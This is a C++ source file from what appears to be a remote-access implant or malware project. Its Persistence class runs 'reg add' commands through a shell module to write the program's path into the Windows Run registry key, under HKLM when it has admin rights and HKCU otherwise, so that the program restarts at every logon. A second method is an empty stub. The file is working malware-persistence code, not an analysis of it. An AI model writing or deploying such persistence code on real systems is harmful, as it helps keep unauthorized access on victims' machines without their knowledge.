#include <iostream>
#include <windows.h>
#include <direct.h> // _getcwd

#include <stdio.h>//move
#include <cstdio> //remove
#include <string>


#include "../inc/Persistence.h"
//#include "../inc/HandShake.h"
#include "../inc/ModShell.h"
#include "../inc/common.h"

using namespace std;


Persistence::Persistence(bool admin,string path_prog)
{
    a_is_admin = admin; //Initialisation attribut.
    a_path_prog = path_prog;
}
int Persistence::defaultPersi()
//Computer\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run
{//Create persistence with the default directories
    //HKEY_CURRENT_USER \ Software \ Microsoft \ Windows \ CurrentVersion \ Run
    //HKEY_LOCAL_MACHINE \ Software \ Microsoft \ Windows \ CurrentVersion \ Run
    string result;
    cout << "IS admin ? " << a_is_admin << endl;
    if(a_is_admin)
    {
        //If admin   
        cout << " \nADMIN\n" << endl;
        cout <<"reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_SZ /d " +a_path_prog + " /v " NAME_KEY_REGISTER << endl;
        ModShell().exec(("reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_SZ /d " +a_path_prog+  " /v " NAME_KEY_REGISTER),result);
        cout <<"Result admin: " <<result << endl;
    }
    else
    {
        cout <<"reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_SZ /d "+a_path_prog+" /v " NAME_KEY_REGISTER << endl;
        ModShell().exec(("reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_SZ /d "+a_path_prog+" /v " NAME_KEY_REGISTER),result);
        cout << "NOt admin result: " << result << endl;
    }
    cout <<"[+] PERSISTENCE FINISH" << endl;
    return 0;
}
int Persistence::customPersi()
{//Coming soon.
    return 0;
}